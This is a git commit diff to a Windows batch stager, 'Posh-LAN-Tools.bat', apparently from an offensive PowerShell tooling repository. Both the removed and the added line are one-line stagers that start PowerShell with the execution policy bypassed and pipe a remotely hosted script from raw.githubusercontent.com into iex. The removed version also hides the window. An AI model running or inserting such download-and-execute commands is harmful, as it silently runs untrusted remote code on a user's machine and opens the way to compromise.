5d3a6e59af424e839604cb36d5ec03aaf871395d
egieb <93350544+beigeworm@users.noreply.github.com>
2023-12-08 21:12:58 +0000

    Update Posh-LAN-Tools.bat

--- Stagers/Posh-LAN-Tools.bat
+++ Stagers/Posh-LAN-Tools.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell.exe -NonI -NoP -W H -C "powershell.exe -Ep Bypass -C $stage = 'y'; irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex"
+powershell.exe -Ep Bypass -C "$stage = 'y'; irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex"
